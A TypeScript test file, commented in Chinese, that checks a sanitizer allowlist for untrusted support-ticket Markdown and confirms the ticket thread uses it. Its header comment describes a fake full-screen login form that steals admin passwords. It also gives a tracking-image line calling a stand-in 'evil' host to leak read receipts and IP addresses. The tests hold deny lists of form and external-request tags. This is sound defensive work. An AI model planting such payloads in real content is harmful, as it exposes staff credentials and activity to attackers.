/*
Copyright (C) 2023-2026 QuantumNous

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU Affero General Public License as
published by the Free Software Foundation, either version 3 of the
License, or (at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
GNU Affero General Public License for more details.

You should have received a copy of the GNU Affero General Public License
along with this program. If not, see <https://www.gnu.org/licenses/>.

For commercial licensing, please contact support@quantumnous.com
*/
/*
 * 工单正文的净化档。
 *
 * # 守什么
 *
 * 工单是本仓第一条「普通用户 → 管理员浏览器」的富文本通道：正文由任何注册
 * 用户写，渲染在客服的处理台里。仓库里那条 Markdown 管线原本是给公告 / 更新
 * 日志（管理员自己写的内容）设计的，它的净化配置放行 `<form>/<input>/<button>`、
 * 任意 `style`/`class`、以及外链图片 —— 在「自己写、自己看」的前提下这些都不
 * 构成边界问题，换到工单上分别是：
 *
 *   1. 客服屏幕上的一个全屏假登录框，提交即把管理员填进去的口令 POST 到
 *      攻击者域名（`<form>` + 一段 `position:fixed` 的 style，或者干脆借站点
 *      自带的工具类，连 CSS 都不用写）；
 *   2. 客服每打开一次工单，攻击者就拿到一次已读回执 + 后台出口 IP + UA
 *      （一张 `![](https://evil/p.png?t=单号)`）。
 *
 * 全站 `grep Content-Security-Policy` 无命中，这份白名单是唯一的一道防线。
 *
 * # 为什么断言的是白名单本身，而不是"渲染一遍看结果"
 *
 * DOMPurify 在 happy-dom 下与真实浏览器的行为**不一致**，实测（bun + happy-dom
 * 18 + dompurify 3.4.11）同一份 `{ALLOWED_TAGS:['p',…]}` 会把 `<p>ok</p>` 削成
 * 纯文本 `ok`，却原样留下 `<input>` 与 `<button>` —— 也就是说在这个环境里跑出来
 * 的"净化结果"既不能证明放行、也不能证明拦截。拿它做断言只会得到一个看起来
 * 很像回事、实际上量的是假 DOM 的测试。
 *
 * 所以这里守三件能守住的事：白名单里没有那些标签/属性、`renderMarkdown` 真的
 * 会按 `untrusted` 切档、以及工单对话真的把这个开关传下去了。三者任一被改动，
 * 上面两个后果就会重新成立。
 */
import assert from 'node:assert/strict'
import { readFileSync } from 'node:fs'
import { dirname, join } from 'node:path'
import { describe, test } from 'node:test'
import { fileURLToPath } from 'node:url'

import { untrustedSanitizeOptions } from '@/components/ui/markdown'

const here = dirname(fileURLToPath(import.meta.url))
const markdownSource = readFileSync(
  join(here, '..', '..', '..', '..', '..', 'components', 'ui', 'markdown.tsx'),
  'utf8'
)

const tags: readonly string[] = untrustedSanitizeOptions.ALLOWED_TAGS
const attrs: readonly string[] = untrustedSanitizeOptions.ALLOWED_ATTR

describe('工单正文的不可信净化档', () => {
  test('白名单里没有任何能拉起表单的标签', () => {
    for (const tag of [
      'form',
      'input',
      'button',
      'select',
      'option',
      'textarea',
      'label',
      'fieldset',
    ]) {
      assert.ok(
        !tags.includes(tag),
        `<${tag}> 一旦放行，攻击者就能在客服的处理台上盖一个假登录框`
      )
    }
  })

  test('白名单里没有任何能发起外部请求的标签', () => {
    for (const tag of [
      'img',
      'picture',
      'source',
      'video',
      'audio',
      'iframe',
      'object',
      'embed',
      'link',
      'style',
      'svg',
      'math',
    ]) {
      assert.ok(
        !tags.includes(tag),
        `<${tag}> 一旦放行，客服每打开一次工单就向攻击者发一次请求（已读回执 + 出口 IP）`
      )
    }
  })

  test('属性白名单里没有 style / class / src 这三类', () => {
    for (const attr of [
      'style',
      'class',
      'src',
      'srcset',
      'background',
      'target',
      'id',
    ]) {
      assert.ok(
        !attrs.includes(attr),
        `${attr} 一旦放行，一段正文就能做成覆盖全视口的浮层（class 甚至不需要写一个字的 CSS，` +
          `站点编译出来的工具类里就有现成的固定定位 + 铺满 + 高层级）`
      )
    }
    assert.equal(
      untrustedSanitizeOptions.ALLOW_DATA_ATTR,
      false,
      'data-* 会成为绕过属性白名单的口子'
    )
  })

  test('正文该有的东西还在', () => {
    // 收紧过头的代价同样具体：工单正文变成纯文本，用户贴的复现链接客服点不开。
    for (const tag of ['a', 'p', 'code', 'pre', 'ul', 'ol', 'li', 'table']) {
      assert.ok(tags.includes(tag), `${tag} 属于正常工单正文`)
    }
    assert.ok(attrs.includes('href'), '外链要能点')
  })

  test('renderMarkdown 按 untrusted 切档', () => {
    assert.match(
      markdownSource,
      /untrusted\s*\?\s*untrustedSanitizeOptions\s*:\s*sanitizeOptions/,
      '两份净化配置都在文件里，但只有这一行决定哪一份真的生效'
    )
  })

  test('工单对话必须把 untrusted 传下去', () => {
    // 净化档存在但没人用等于不存在，而少传一个布尔 prop 不会有任何报错。
    const thread = readFileSync(
      join(here, '..', 'components', 'ticket-thread.tsx'),
      'utf8'
    )
    assert.match(
      thread,
      /<Markdown[^>]*\suntrusted/,
      '工单对话里的正文必须走不可信净化档'
    )
  })
})
